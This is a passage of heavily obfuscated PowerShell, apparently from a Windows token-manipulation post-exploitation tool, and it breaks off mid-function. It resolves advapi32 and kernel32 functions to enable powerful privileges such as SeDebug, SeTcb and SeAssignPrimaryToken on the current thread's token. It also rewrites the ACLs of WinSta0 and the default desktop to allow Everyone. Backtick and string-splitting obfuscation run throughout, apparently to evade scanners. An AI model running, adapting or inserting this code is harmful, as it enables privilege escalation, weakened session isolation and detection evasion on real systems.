    ${GetcuRrENT`T`H`ReaD} =   ( Item variaBlE:y5MVl).vaLUE::("{1}{0}{3}{4}{6}{5}{2}"-f'legateFo','GetDe','er','r','Fun','tionPoint','c').Invoke(${g`E`TC`URrENt`ThreADAdDr}, ${GetCUrr`En`TtHReAdd`EL`EGaTe})

    ${G`ETsECU`R`iTyINF`OA`DDr} = &("{0}{2}{1}"-f 'Get-Pro','Address','c') ("{1}{0}{2}"-f'2.d','advapi3','ll') ("{0}{3}{1}{2}" -f'Ge','yIn','fo','tSecurit')
    ${gETsECURI`TY`iNF`o`DElEGaTe} = &("{2}{0}{3}{1}" -f't','egateType','Ge','-Del') @([IntPtr], [UInt32], [UInt32],  (vaRIablE ("B8"+"F4I") ).ValuE.("{3}{2}{1}{0}" -f 'e','Typ','ef','MakeByR').Invoke(),   (  gEt-iTEm ('v'+'ar'+'I'+'ABle:B8f4I') ).VAluE.("{1}{2}{0}"-f'RefType','M','akeBy').Invoke(),   $b8F4I.("{1}{2}{0}" -f 'RefType','Make','By').Invoke(),  (GcI ('V'+'ArIaBl'+'E:b8f'+'4i')  ).VALue.("{4}{1}{0}{2}{3}" -f'B','e','yRefTyp','e','Mak').Invoke(),  ( GeT-variAblE b8f4i ).VAlUe.("{0}{1}{2}"-f'Mak','eBy','RefType').Invoke()) ([UInt32])
    ${GET`secU`RityI`N`FO} =   $y5mVl::("{4}{5}{2}{1}{0}{3}" -f 'tio','gateForFunc','le','nPointer','GetD','e').Invoke(${GeTsEcURI`TyIn`Fo`A`ddR}, ${Ge`Ts`ecURi`TYi`NFodelE`GAte})

    ${s`EtS`e`C`URITYinfOadDr} = &("{3}{1}{2}{0}{4}" -f'dr','t-Pro','cAd','Ge','ess') ("{0}{1}{2}"-f 'advapi32.','dl','l') ("{2}{4}{3}{0}{1}"-f 'In','fo','S','urity','etSec')
    ${s`E`TSeCURIT`yInFoDel`egate} = &("{2}{0}{1}{3}" -f 't-De','legateTyp','Ge','e') @([IntPtr], [UInt32], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([UInt32])
    ${seTseC`UR`IT`YInfo} =   (  DIR VarIaBLE:y5mVl  ).vAlue::("{4}{6}{8}{0}{7}{1}{5}{3}{2}" -f'leg','Fo','onPointer','uncti','Ge','rF','tD','ate','e').Invoke(${Set`sEC`U`Ri`Tyi`NfoADdR}, ${s`ETSECuri`TyiNF`ODEL`E`gATe})

    ${Ge`Ta`cea`Ddr} = &("{0}{1}{2}{3}" -f 'Get-ProcA','dd','re','ss') ("{2}{1}{0}"-f '.dll','i32','advap') ("{0}{1}"-f'GetA','ce')
    ${gEtaCeD`e`LeGAte} = &("{4}{1}{0}{3}{2}"-f'eT','legat','e','yp','Get-De') @([IntPtr], [UInt32],  (  VarIABLE b8f4i  ).VAlUE.("{0}{1}{2}{3}" -f'Ma','ke','B','yRefType').Invoke()) ([IntPtr])
    ${G`ETaCe} =   ( Get-VAriaBle  ('y'+'5MvL')  ).vaLUe::("{3}{0}{5}{6}{1}{2}{4}{7}" -f 'etDelegate','onPoin','t','G','e','ForFunct','i','r').Invoke(${Ge`T`A`ceaDdR}, ${ge`Tac`ede`lEg`Ate})

    ${Loo`ku`pA`ccoUnt`SiDWadDr} = &("{2}{1}{0}{3}"-f 'A','c','Get-Pro','ddress') ("{2}{1}{3}{0}"-f 'll','2.','advapi3','d') ("{1}{0}{4}{2}{3}"-f'untS','LookupAcco','d','W','i')
    ${LOokUP`AccOu`NtsidWd`elEGA`TE} = &("{2}{1}{0}{3}"-f'l','t-De','Ge','egateType') @([IntPtr], [IntPtr], [IntPtr],   ( chILDiTeM vaRIAbLE:dPJY  ).VAlUe.("{2}{0}{1}"-f'Ref','Type','MakeBy').Invoke(), [IntPtr],   (VaRiAblE DpJY  -VALUEonLY ).("{3}{2}{0}{1}" -f'p','e','yRefTy','MakeB').Invoke(),   (  GeT-VarIABLE ("Dp"+"jy")  -VaL).("{3}{2}{0}{1}" -f'p','e','eByRefTy','Mak').Invoke()) ([Bool])
    ${LOOKu`pAc`Cou`NTsiDW} =   $y5mVL::("{3}{2}{4}{5}{0}{1}{6}" -f'nP','oint','ele','GetD','gateFo','rFunctio','er').Invoke(${loO`Kup`ACCOun`TS`idwAdDR}, ${L`o`o`kUpaCC`OU`N`TsIdWDELEgaTe})

    ${AddAccE`ssa`l`LowE`DA`ceAd`Dr} = &("{2}{3}{1}{4}{0}" -f 'ss','r','Ge','t-ProcAdd','e') ("{2}{1}{3}{0}"-f'dll','vapi32','ad','.') ("{2}{3}{6}{5}{0}{4}{1}" -f 'o','dAce','AddAc','ce','we','l','ssAl')
    ${aDDaCcE`s`SALlOwe`D`AceD`ElE`g`ATe} = &("{0}{2}{1}{3}" -f'G','gateT','et-Dele','ype') @([IntPtr], [UInt32], [UInt32], [IntPtr]) ([Bool])
    ${a`Dd`AcCE`SSaL`lOwEdacE} =  (  variaBle  Y5mVl -VAluEONlY )::("{0}{3}{1}{2}{5}{4}"-f'GetDele','teFo','rFu','ga','inter','nctionPo').Invoke(${A`D`Dacces`sAllo`wEd`Ac`eaddR}, ${AddaCcESS`A`LLoWEDaCe`DeL`EGa`Te})

    ${c`RE`ATE`Well`KNoWnSi`d`ADDr} = &("{4}{2}{1}{0}{3}" -f'Addre','oc','t-Pr','ss','Ge') ("{1}{2}{0}" -f '32.dll','advap','i') ("{3}{1}{2}{0}{5}{4}"-f'Known','eW','ell','Creat','id','S')
    ${CreA`TEW`E`lL`KNOw`NsIDdEL`Egate} = &("{0}{2}{1}{3}"-f 'Get-','gate','Dele','Type') @([UInt32], [IntPtr], [IntPtr],  ( geT-VarIaBle  dPjY  ).vaLUe.("{0}{3}{2}{1}" -f'MakeByRe','e','yp','fT').Invoke()) ([Bool])
    ${CReAteW`e`l`lkn`oWnSiD} =  $Y5MvL::("{0}{4}{1}{2}{5}{3}" -f'GetDele','nc','tionP','inter','gateForFu','o').Invoke(${c`R`EateWeL`LK`N`OW`NSidadDr}, ${C`REaTew`el`LkNO`wn`sIDD`E`legATE})

    ${SETe`Nt`Riesi`Na`CLwA`ddR} = &("{0}{1}{2}{3}"-f 'Get-P','rocA','dd','ress') ("{3}{0}{2}{1}" -f 'pi','dll','32.','adva') ("{0}{1}{2}{3}"-f'SetEn','triesInA','c','lW')
    ${S`E`T`eNtRiEsI`Nacl`WdEL`EGate} = &("{3}{2}{1}{0}{4}"-f 'gateTy','ele','D','Get-','pe') @([UInt32], ${E`XpLiCi`T_`AC`CeSS}.("{0}{3}{1}{2}"-f 'MakeBy','y','pe','RefT').Invoke(), [IntPtr],  $B8f4i.("{3}{0}{1}{2}" -f'ak','eByRefTyp','e','M').Invoke()) ([UInt32])
    ${sETeN`T`R`iE`SiNACLW} =  $y5MVL::("{2}{0}{1}{3}{6}{4}{7}{5}"-f'De','legateF','Get','o','uncti','ter','rF','onPoin').Invoke(${Se`T`En`TriESIN`ACL`WAD`dr}, ${s`eteNtri`E`SinAcLWdEl`E`gA`Te})

    ${L`OCA`lFREeA`DDr} = &("{1}{0}{3}{2}" -f'et-ProcA','G','ress','dd') ("{2}{0}{1}{3}" -f'e','rnel3','k','2.dll') ("{2}{1}{0}"-f 'e','Fre','Local')
    ${L`OC`AL`FrEE`DelE`gATe} = &("{1}{3}{0}{2}" -f'Typ','Ge','e','t-Delegate') @([IntPtr]) ([IntPtr])
    ${l`oca`lfReE} =   ( ChILdiTEm  vaRiaBLe:y5mvL).VALuE::("{2}{4}{0}{6}{5}{3}{1}"-f 'o','er','GetDel','ionPoint','egateF','nct','rFu').Invoke(${LOCal`FrEe`A`DdR}, ${L`oCAl`FrEEdELE`GAte})

    ${L`OOku`PPRivIL`EgEnam`eW`AD`dR} = &("{0}{1}{2}" -f'Get-P','ro','cAddress') ("{2}{0}{1}"-f 'd','vapi32.dll','a') ("{1}{4}{0}{3}{5}{2}{6}"-f 'ri','L','N','vile','ookupP','ge','ameW')
    ${lOO`kUp`PR`IvI`leGEn`A`mEW`dEL`EGAte} = &("{0}{3}{1}{2}" -f 'Get-Dele','p','e','gateTy') @([IntPtr], [IntPtr], [IntPtr],  ( DiR variaBLe:DPJY  ).VaLUe.("{0}{1}{2}{3}"-f 'Ma','keB','yRef','Type').Invoke()) ([Bool])
    ${loO`KUpPrIV`iLe`geNA`m`Ew} =   $y5mvl::("{5}{3}{4}{0}{2}{1}" -f 'in','r','te','Functi','onPo','GetDelegateFor').Invoke(${loo`Kup`prIviL`eGenamEw`AddR}, ${LO`OKUP`PrI`V`iLe`GeNAMEwd`el`eGatE})
    


    
    Function A`dD-SIgNED`iNtaSuNSI`GNeD
	{
		Param(
		[Parameter(pOSItion = 0, manDaTory = ${T`Rue})]
		[Int64]
		${VA`Lue1},
		
		[Parameter(POsitiOn = 1, mAndatoRY = ${t`RUe})]
		[Int64]
		${v`ALue2}
		)
		
		[Byte[]]${vaLue1B`Y`TeS} =   (item  ("vArIa"+"b"+"LE:7pj3"+"Oi")).VAlUE::("{1}{0}"-f 's','GetByte').Invoke(${vaL`UE1})
		[Byte[]]${V`ALu`e2`BYteS} =  (  ITeM  VARiABlE:7pJ3oI ).VAlue::("{1}{2}{0}" -f 'tes','GetB','y').Invoke(${V`A`LUe2})
		[Byte[]]${fi`NalbY`TEs} =  $7pj3oI::"ge`Tbyt`eS"([UInt64]0)

		if (${vA`lUE1`B`YTeS}."co`UNT" -eq ${vaLU`E`2b`yTes}."C`ounT")
		{
			${cA`RrY`over} = 0
			for (${i} = 0; ${i} -lt ${v`ALue`1BYTES}."CO`UNt"; ${I}++)
			{
				
				[UInt16]${s`Um} = ${v`AluE`1`BYTes}[${I}] + ${v`AlUE`2bytES}[${i}] + ${c`ArRYo`Ver}

				${f`iNa`lbY`Tes}[${I}] = ${s`UM} -band 0x00FF
				
				if ((${S`Um} -band 0xFF00) -eq 0x100)
				{
					${cARr`yO`V`Er} = 1
				}
				else
				{
					${C`ARR`yOV`er} = 0
				}
			}
		}
		else
		{
			Throw ("{11}{8}{2}{3}{0}{6}{5}{10}{12}{4}{7}{9}{1}" -f'rays ','s',' ','bytear',' ','fe','of dif','siz','add','e','r','Cannot ','ent')
		}
		
		return  $7Pj3OI::("{2}{0}{1}" -f'oIn','t64','T').Invoke(${finALb`y`TeS}, 0)
	}


    
    function EnA`B`LE-S`eAs`sIGn`PRiMa`Ry`T`oKE`NPrIvILegE
    {	
	    [IntPtr]${t`hReA`dhAn`Dle} = ${gE`TcUR`ReNTth`R`eaD}."iNVO`KE"()
	    if (${tHReaDH`A`NDlE} -eq  $B8F4i::"Ze`Ro")
	    {
		    Throw ("{6}{3}{2}{1}{5}{8}{9}{7}{4}{0}"-f'd','e hand',' th','ble to get','ea','le t','Una','hr','o the current',' t')
	    }
		
	    [IntPtr]${thr`EaDT`Ok`En} =   (  gET-chiLditem  vArIABLe:b8f4i ).VALUE::"Ze`RO"
	    [Bool]${r`eSU`Lt} = ${openThr`EadT`o`kEn}."IN`VokE"(${TH`R`eadh`ANdlE}, ${wi`N32C`O`N`STANTS}."t`Ok`EN_q`UERY" -bor ${W`iN3`2`CoNstAN`Ts}."toKeN_A`d`JuST`_`p`RiVIlegEs", ${fA`LsE}, [Ref]${Thr`EadTO`Ken})
        ${er`RoRC`oDe} =   ( Get-vARIaBLE  ("Y5m"+"VL")  -Va )::("{2}{3}{0}{1}"-f 'n','32Error','GetLa','stWi').Invoke()

	    if (${res`U`lT} -eq ${FA`lse})
	    {
		    if (${Er`ROR`co`DE} -eq ${Win3`2c`O`NStANts}."eR`RoR_`No_t`OKEn")
		    {
			    ${Resu`Lt} = ${IM`P`ERsoN`AtesELF}."iNv`o`KE"(${WIn32C`oNsT`ANtS}."Secu`Rity`_dEL`egaTIoN")
			    if (${R`EsUlt} -eq ${FA`LSE})
			    {
				    Throw (&("{2}{1}{0}" -f'bject','-O','New') ("{2}{0}{1}{4}{6}{3}{7}{5}" -f'pon','entModel.Wi','Com','xcep','n3','n','2E','tio'))
			    }
				
			    ${REs`U`Lt} = ${OP`EntHR`eA`d`T`okEN}."iNvO`KE"(${tHREa`dh`AnD`LE}, ${wI`N`32C`oN`staNts}."tokEN_Qu`e`RY" -bor ${WIN3`2cON`S`TaNtS}."TOken_`ADjuS`T`_p`Riv`Ileges", ${F`ALSe}, [Ref]${th`R`e`AdtoKEn})
			    if (${ReSU`Lt} -eq ${F`AlSe})
			    {
				    Throw (&("{0}{1}{2}" -f'New','-Ob','ject') ("{8}{2}{7}{1}{4}{3}{0}{6}{5}"-f'xce','in3','ent','E','2','n','ptio','Model.W','Compon'))
			    }
		    }
		    else
		    {
			    Throw ([ComponentModel.Win32Exception] ${eR`RORc`o`dE})
		    }
	    }

        ${cl`OseH`AN`dle}."i`Nv`okE"(${thREAD`H`A`N`DlE}) | &("{1}{0}" -f'-Null','Out')
	
        ${l`U`iDSize} =   (  GeT-vaRiABle Y5Mvl -vALuEon  )::"S`iZe`Of"([Type]${L`UiD})
        ${l`UIdP`Tr} =   $y5mvl::("{1}{3}{0}{2}" -f 'a','Allo','l','cHGlob').Invoke(${LUi`dsiZE})
        ${LUIdo`Bj`eCT} =   (GET-IteM vAriabLe:Y5mvL).vALUE::"pTR`T`OS`Tru`CtURE"(${lU`I`dPTr}, [Type]${l`UiD})
         (  gET-chIlDiTEM  ("VaR"+"i"+"ABLE:y5mvL") ).ValUE::("{1}{2}{0}"-f'bal','F','reeHGlo').Invoke(${lU`IDPTr})

	    ${RE`S`ULT} = ${lO`o`KUp`Pr`Ivil`egEvAl`Ue}."inV`OkE"(${N`ULL}, ("{1}{8}{0}{3}{4}{7}{6}{5}{2}" -f'ign','S','vilege','Prim','aryT','nPri','e','ok','eAss'), [Ref] ${L`UI`D`OBjEct})

	    if (${REs`ULT} -eq ${fAl`SE})
	    {
		    Throw (&("{0}{1}{2}"-f 'N','ew-O','bject') ("{4}{3}{5}{0}{7}{6}{2}{1}{8}"-f'o','in3','W','ent','Compon','M','el.','d','2Exception'))
	    }

        [UInt32]${l`U`IDA`Ndat`T`RiBUte`SsIze} =  (  geT-vAriAbLe y5mvl).value::"Si`ZEOF"([Type]${lUID`_`A`Nd_ATTR`iBU`TeS})
        ${lu`Ida`N`d`AttR`IButesP`Tr} =  ( gET-vAriaBlE Y5MvL  -valUeoNL)::("{2}{0}{1}" -f'l','obal','AllocHG').Invoke(${lUiDAN`DatT`R`iBUtEss`IZE})
        ${LU`idan`Datt`RIBuT`ES} =  (  DiR  VAriABLE:Y5MVL ).vaLUe::"P`T`RTo`s`TruCTuRE"(${lU`IdAnda`TTrIBu`Te`SPTr}, [Type]${LuID_`AND_a`Ttr`iBuTeS})
         (get-vARIABLe  y5mVL).VAlUe::("{2}{1}{0}" -f 'Global','reeH','F').Invoke(${LUI`Da`NDat`Tri`BUte`SPtR})

        ${l`UiDANd`ATt`RI`Bu`Tes}."lU`iD" = ${lu`i`dOBje`ct}
        ${LU`iDaNdATT`RIb`UTEs}."attri`Bu`TES" = ${wi`N3`2co`NstanTS}."s`e_prI`V`ILe`GE_EnABLed"

        [UInt32]${tOK`EnPr`iVsiZE} =   ( ChildITeM VArIaBLe:Y5mvL ).valUE::"S`I`ZEOF"([Type]${tOKEN_P`RI`VI`LEGES})
        ${T`o`KEnPRiVI`Le`GeSP`TR} =  (  LS  ("V"+"ArIa"+"BLe:y5M"+"V"+"L")).VALuE::("{2}{1}{0}" -f'al','locHGlob','Al').Invoke(${TOkeN`PrIv`S`I`zE})
        ${tokEnPriv`i`lEg`ES} =   (VariAble  ("Y5"+"mvL")  ).VAlue::"p`TrT`Os`TRuct`URE"(${tO`KENPrivI`l`EgE`spTr}, [Type]${TOke`N_`prIVile`geS})
          $Y5Mvl::("{0}{1}{2}"-f 'FreeHG','lo','bal').Invoke(${Tok`ENp`R`iVileGESptr})
	    ${toK`enPRI`VILe`ges}."pRiV`I`l`eGeCOUNt" = 1
	    ${T`O`KEnpRI`VIlE`gES}."PrIv`ilEg`ES" = ${LU`i`daN`DAT`TrIbUt`eS}

        ${GLObAL:t`oKe`NPr`IV} = ${To`KEnP`RivIlE`GES}

	    ${R`eSulT} = ${ADJ`USt`To`kenpRIvilE`gEs}."INv`OKe"(${th`READ`T`oKen}, ${fA`lse}, [Ref] ${tOk`eN`privilE`gES}, ${To`kENpRI`V`sIZe},  (  gci ("vAr"+"IaB"+"lE:b8"+"F4i") ).vALuE::"zE`Ro",  ( CHiLdItEM VarIaBlE:B8f4i ).VAlue::"Z`Ero")
	    if (${ReSu`lT} -eq ${fa`L`se})
	    {
            Throw (&("{1}{3}{2}{0}"-f'ject','Ne','Ob','w-') ("{2}{1}{0}{4}{6}{5}{3}"-f'nen','mpo','Co','ception','tMo','2Ex','del.Win3'))
	    }

        ${CLOSeHa`Nd`lE}."IN`VokE"(${thrEA`d`T`oken}) | &("{0}{2}{1}" -f'O','-Null','ut')
    }


    
    function E`N`A`BL`e-priVil`EGE
    {
        Param(
            [Parameter()]
            [ValidateSet({"{0}{5}{4}{1}{2}{3}"-f'SeAssi','le','g','e','okenPrivi','gnPrimaryT'}, {"{3}{2}{1}{0}{4}"-f 'v','tPri','di','SeAu','ilege'}, {"{0}{2}{1}{3}" -f'S','k','eBac','upPrivilege'}, {"{3}{0}{2}{1}{4}" -f 'hangeN','rivileg','otifyP','SeC','e'}, {"{0}{5}{4}{1}{3}{2}" -f 'SeCr','ivi','ge','le','lPr','eateGloba'},
                {"{1}{0}{3}{4}{2}"-f'eC','S','agefilePrivilege','reat','eP'}, {"{4}{7}{0}{6}{2}{3}{1}{5}"-f 'nent','g','riv','ile','SeCreat','e','P','ePerma'}, {"{1}{3}{0}{6}{5}{2}{4}{7}"-f 'y','Se','l','CreateS','eg','ivi','mbolicLinkPr','e'}, {"{4}{5}{0}{1}{2}{3}"-f'ate','TokenPr','ivile','ge','S','eCre'},
                {"{3}{0}{4}{1}{2}" -f'e','ugP','rivilege','SeD','b'}, {"{2}{4}{5}{0}{3}{1}"-f'egationP','ge','Se','rivile','Enabl','eDel'}, {"{3}{4}{1}{5}{0}{2}"-f'sonat','pe','ePrivilege','S','eIm','r'}, {"{2}{1}{4}{3}{5}{0}{6}"-f'or','eIncre','S','seBa','a','sePri','ityPrivilege'},
                {"{3}{4}{2}{1}{0}" -f 'e','eg','ivil','SeIncreaseQ','uotaPr'}, {"{7}{0}{2}{3}{8}{5}{4}{1}{6}"-f 'n','g','creaseWorkin','gSetPr','e','l','e','SeI','ivi'}, {"{3}{2}{1}{0}"-f 'ge','iverPrivile','LoadDr','Se'}, {"{6}{5}{0}{2}{1}{4}{3}"-f 'e','y','mor','rivilege','P','eLockM','S'}, {"{2}{4}{3}{0}{1}" -f'rivileg','e','SeMa','ntP','chineAccou'},
                {"{6}{5}{2}{4}{3}{1}{0}"-f'ilege','riv','geVo','eP','lum','Mana','Se'}, {"{5}{1}{7}{3}{2}{4}{6}{0}" -f 'ge','Pr','es','ingleProc','sPriv','Se','ile','ofileS'}, {"{2}{3}{0}{1}"-f'eg','e','SeRel','abelPrivil'}, {"{2}{1}{0}{3}{5}{4}" -f 'o','em','SeR','teSh','tdownPrivilege','u'}, {"{3}{1}{0}{2}{4}{5}"-f 'Resto','e','re','S','Pri','vilege'},
                {"{4}{3}{1}{5}{2}{0}"-f 'ge','Pr','ile','y','SeSecurit','iv'}, {"{1}{4}{0}{3}{2}" -f 'utdownPri','S','ge','vile','eSh'}, {"{0}{1}{3}{2}"-f 'SeSy','ncAgentPr','ge','ivile'}, {"{7}{2}{6}{5}{1}{0}{4}{3}" -f'e','nvironm','eSys','lege','ntPrivi','mE','te','S'}, {"{7}{1}{6}{0}{5}{2}{4}{3}"-f'fi','tem','ePri','ege','vil','l','Pro','SeSys'},
                {"{3}{2}{1}{4}{0}"-f'lege','iv','SystemtimePr','Se','i'}, {"{5}{6}{1}{0}{2}{4}{3}"-f'er','n','shipP','ege','rivil','SeT','akeOw'}, {"{0}{1}{2}" -f'SeTcbPrivi','le','ge'}, {"{3}{0}{2}{1}"-f'imeZonePriv','ge','ile','SeT'}, {"{9}{8}{4}{7}{2}{5}{0}{6}{1}{3}"-f'cce','vileg','stedCredM','e','T','anA','ssPri','ru','e','S'},
                {"{2}{0}{1}{3}"-f'Undoc','kPri','Se','vilege'}, {"{3}{1}{6}{5}{0}{4}{2}" -f'P','solicitedIn','ge','SeUn','rivile','t','pu'})]
            [String]
            ${p`R`IvIlEge}
        )

	    [IntPtr]${t`H`Rea`DHaNDle} = ${g`E`TcUrREN`T`ThrEAD}."I`N`VoKe"()
	    if (${t`hREADh`ANDLE} -eq  (  vARIABle  ("B"+"8F4I") ).vaLue::"Z`ERo")
	    {
		    Throw ("{2}{5}{1}{7}{3}{4}{6}{0}"-f 'the current thread','o g','U','t the ','handl','nable t','e to ','e')
	    }
		
	    [IntPtr]${TH`REAd`TokEN} =  (vAriABlE  b8f4I -vALuEONl  )::"z`Ero"
	    [Bool]${R`e`SUlt} = ${o`PentHRe`Ad`Tok`EN}."InVo`KE"(${t`HR`Ea`Dh`ANDLE}, ${wi`N32Co`NsTA`Nts}."t`OKe`N_q`UeRy" -bor ${Win3`2C`o`NsTaN`TS}."TOk`e`N_`AD`jU`St_`PrIVILEges", ${FAl`Se}, [Ref]${tHr`e`A`DtokEN})
        ${err`O`RcODe} =  (gET-VARIAble  y5Mvl -Val  )::("{1}{4}{3}{2}{0}" -f 'or','GetLas','rr','Win32E','t').Invoke()

	    if (${R`esU`lt} -eq ${FAl`SE})
	    {
		    if (${eR`RORc`OdE} -eq ${w`in3`2Con`STAn`TS}."e`RroR_nO`_t`o`KeN")
		    {
			    ${RE`sU`Lt} = ${i`MpERS`onatESELF}."INVO`KE"(${w`IN`32CoNstan`TS}."sE`Cu`RiT`y_`dEleGAtiON")
			    if (${RES`U`lT} -eq ${fA`L`sE})
			    {
				    Throw (&("{2}{1}{0}" -f'ect','j','New-Ob') ("{6}{3}{0}{4}{2}{7}{5}{1}"-f'Mode','on','32E','mponent','l.Win','pti','Co','xce'))
			    }
				
			    ${R`eSU`lt} = ${oP`Ent`HrEAdt`oKeN}."InvO`Ke"(${Thr`E`ADHa`NDle}, ${Win32`co`Ns`T`ANtS}."T`OKeN_Que`Ry" -bor ${WiN32CONS`Ta`NTs}."tOKen_AdJ`USt`_Pr`I`V`i`lEgES", ${Fal`se}, [Ref]${ThReAd`To`kEn})
			    if (${rE`suLt} -eq ${f`ALSE})
			    {
				    Throw (&("{0}{2}{1}"-f 'New-O','ject','b') ("{3}{0}{1}{5}{4}{2}" -f 'onentModel','.Win32','n','Comp','tio','Excep'))
			    }
		    }
		    else
		    {
			    Throw ([ComponentModel.Win32Exception] ${er`RO`RcO`DE})
		    }
	    }

        ${clo`SE`HAnDlE}."inVo`kE"(${TH`ReaDH`A`N`Dle}) | &("{0}{2}{1}" -f'Out','ll','-Nu')
	
        ${LUi`d`si`Ze} =   (vaRiABlE Y5MvL ).VaLue::"SiZE`OF"([Type]${L`Uid})
        ${lu`iD`ptr} =  ( get-ItEm VariABLE:Y5mVL).vALue::("{0}{3}{2}{1}"-f'All','l','oba','ocHGl').Invoke(${LU`id`sizE})
        ${LU`iDOBJ`ECt} =  (  gEt-varIablE  y5mVl).VAlue::"PTRtOSTrU`CT`U`RE"(${lUId`ptR}, [Type]${LU`id})
         (  VarIAbLE Y5mvl  -valueo )::("{3}{1}{0}{2}" -f 'ba','HGlo','l','Free').Invoke(${l`UiDpTR})

	    ${reS`U`Lt} = ${lOo`ku`Ppr`IViLegE`VAluE}."I`N`Voke"(${nU`lL}, ${pRiV`i`LEGE}, [Ref] ${l`UIdO`BjEct})

	    if (${rEsU`LT} -eq ${fa`lse})
	    {
		    Throw (&("{0}{2}{1}"-f 'New','bject','-O') ("{1}{2}{4}{3}{5}{0}"-f 'ption','C','o','x','mponentModel.Win32E','ce'))
	    }

        [UInt32]${l`UId`An`DatT`R`IbUTESS`ize} =  ( GEt-VariAblE  ("Y5Mv"+"l")  -Va)::"S`Ize`Of"([Type]${lU`Id_`AnD_ATTr`i`Bu`TeS})
        ${l`U`idANdA`TT`RIBUTe`sPTR} =  ( gi VaRiABle:y5MvL ).vALUe::("{0}{1}{3}{2}" -f'AllocHG','lo','l','ba').Invoke(${luiDANd`A`T`TriBu`Te`S`SIzE})
        ${l`U`iDA`N`DAtTrIbUTES} =   ( GEt-vArIabLE  Y5mvl  -VaLueON)::"pTrtoSt`Ructu`Re"(${Lu`IDan`DaTtRi`B`U`Te`spTR}, [Type]${lUi`D_An`D_aTT`RIbu`T`ES})
          ( VaRIaBLe  Y5Mvl -VALu  )::("{2}{0}{3}{1}" -f 'eeHGl','l','Fr','oba').Invoke(${luI`Da`Nd`AttRi`B`Ute`SPTR})

        ${LUIDAn`daTtR`I`BU`T`ES}."Lu`Id" = ${LUiD`obj`EcT}
        ${l`UIDAndATT`Ri`BuTEs}."aTt`Rib`Ut`eS" = ${Win32co`NS`TA`N`TS}."Se_`prI`ViLege_eNA`B`LeD"

        [UInt32]${tOKEn`p`Ri`VSize} =  $Y5mvl::"siZ`EOF"([Type]${t`okEn_PRIv`I`lEgES})
        ${To`keNPr`ivIL`eGesptR} =  (  GEt-vAriaBLE ("Y5"+"MvL") -val  )::("{2}{1}{0}" -f 'al','b','AllocHGlo').Invoke(${t`oKe`N`PRiVsIzE})
        ${toKE`NPR`I`ViLe`G`eS} =   $Y5MVL::"PTr`ToSTR`UcTU`Re"(${ToK`ENpr`IViL`e`G`e`SPTR}, [Type]${T`ok`En_Pri`VI`LeGEs})
          (  Ls  ('Va'+'riaBlE:y5m'+'vl')  ).vAlUe::("{2}{1}{0}{3}" -f'Glob','eeH','Fr','al').Invoke(${tOkeNprIV`i`lEg`EspTr})
	    ${TokeNP`RIvI`L`EG`Es}."pRivil`e`G`e`CoUnt" = 1
	    ${tOk`EN`pRi`VILe`GeS}."p`RI`VIle`geS" = ${L`UiDAn`d`ATTR`IbuTes}

        ${GL`OB`A`l:toKe`NP`RiV} = ${TOkE`NPr`Iv`iLEg`Es}

        &("{1}{2}{0}" -f 'Verbose','Wri','te-') ('Attempt'+'in'+'g '+'t'+'o '+'ena'+'bl'+'e '+'p'+'riv'+'il'+'ege: '+"$Privilege")
	    ${Resu`LT} = ${adjUstTo`kENpriV`i`LEGes}."inv`oke"(${T`hR`EaDto`kEn}, ${F`Alse}, [Ref] ${tOKE`Np`Ri`ViLEgEs}, ${TOke`NpRI`VSize},   (  GET-ChiLDitEM  VARiabLe:b8F4I  ).valUe::"Ze`Ro",  ( variaBlE b8f4I  -Value)::"ze`RO")
	    if (${rES`U`LT} -eq ${F`ALSE})
	    {
            Throw (&("{0}{1}{3}{2}" -f'New','-O','ject','b') ("{3}{0}{5}{6}{1}{8}{2}{4}{7}" -f 'm','ent','el.Win','Co','32Excepti','p','on','on','Mod'))
	    }

        ${C`lo`sehandle}."INVO`kE"(${Thr`eADtO`keN}) | &("{2}{0}{1}" -f't-Nul','l','Ou')
        &("{3}{2}{0}{1}"-f'b','ose','r','Write-Ve') ('Enab'+'led'+' '+'p'+'rivil'+'ege:'+' '+"$Privilege")
    }


    
    function Set-D`EsKto`pAC`ls
    {
        &("{0}{4}{1}{3}{2}"-f'Enable-P','i','ge','vile','r') -Privilege ("{2}{0}{4}{3}{1}"-f'rityPri','ge','SeSecu','e','vil')

        
        ${WInd`oW`ST`At`iOnsTR} =  (  VARiAble Y5MvL  -VaL  )::("{1}{3}{4}{2}{0}"-f 'GlobalUni','Stri','H','ngT','o').Invoke(("{0}{1}" -f'WinSt','a0'))
        ${H`WInSta} = ${OpeN`win`do`W`sTAti`OnW}."In`V`oke"(${w`iN`dOW`StAtIoN`s`Tr}, ${FaL`SE}, ${W`iN32CON`STaNts}."AC`CESs_S`Y`StEm`_sE`CURItY" -bor ${WiN`3`2cOn`stANTS}."re`Ad_CONt`R`Ol" -bor ${W`IN3`2cOnstAN`TS}."W`R`ItE_Dac")

        if (${h`W`inStA} -eq   $b8F4I::"ZE`RO")
        {
            Throw (&("{2}{3}{0}{1}"-f'-Obj','ect','Ne','w') ("{2}{1}{4}{0}{5}{3}"-f 'xce','ompo','C','ion','nentModel.Win32E','pt'))
        }

        &("{5}{4}{1}{2}{3}{6}{0}"-f 'wEveryone','t','op','ACLT','t-Desk','Se','oAllo') -hObject ${HwIn`S`TA}
        ${ClOs`EhAN`DLE}."inV`OKE"(${h`wi`NsTA}) | &("{0}{2}{1}"-f'Out','ull','-N')

        
        ${H`De`sKTop} = ${O`PEn`De`SKTOpa}."i`N`VOKe"(("{1}{0}"-f'lt','defau'), 0, ${fa`LsE}, ${Win32C`OnS`Ta`NtS}."D`esk`ToP`_geNerIC_AlL" -bor ${Win`3`2CoNsT`ANTS}."wrI`TE_`daC")
        if (${h`DeS`kTOP} -eq  (  vaRiABle  b8f4I -vaLueonLy)::"Z`ERo")
        {
            Throw (&("{1}{2}{0}"-f 'bject','New-','O') ("{8}{0}{5}{6}{4}{2}{1}{3}{7}" -f'omp','32E','in','x','ntModel.W','on','e','ception','C'))
        }

        &("{5}{4}{0}{1}{2}{3}"-f'LT','oA','llowEveryon','e','C','Set-DesktopA') -hObject ${h`des`ktoP}
        ${cLoS`Eh`AN`DLE}."in`VOKE"(${hDESk`Top}) | &("{1}{0}"-f 't-Null','Ou')
    }


    function s`et`-desKTo`PA`c`LtoallOw`EverY`oNE
    {
        Param(
            [IntPtr]${hOb`J`eCt}
            )

        [IntPtr]${p`PSID`OWNeR} =  (iTEm  VariaBLE:B8f4i  ).ValUE::"ze`RO"
        [IntPtr]${p`PsiDg`Ro`Up} =   (GI vAriaBle:b8F4I).VaLue::"z`eRo"
